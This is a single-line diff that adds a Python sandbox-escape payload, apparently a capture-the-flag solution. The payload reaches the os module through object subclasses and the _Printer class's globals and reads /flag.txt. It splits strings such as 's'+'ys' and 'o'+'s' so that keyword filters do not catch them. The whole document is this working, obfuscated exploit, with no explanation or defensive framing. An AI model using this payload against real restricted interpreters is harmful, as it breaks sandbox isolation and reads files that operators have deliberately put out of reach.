@@ -1,0 +1,1 @@
+[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__=='_Prin'+'ter'][0].__init__.__globals__['s'+'ys'].modules['o'+'s'].__dict__['re'+'ad']([x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__=='_Prin'+'ter'][0].__init__.__globals__['s'+'ys'].modules['o'+'s'].__dict__['o'+'pen']('/f'+'lag.txt',0),100)
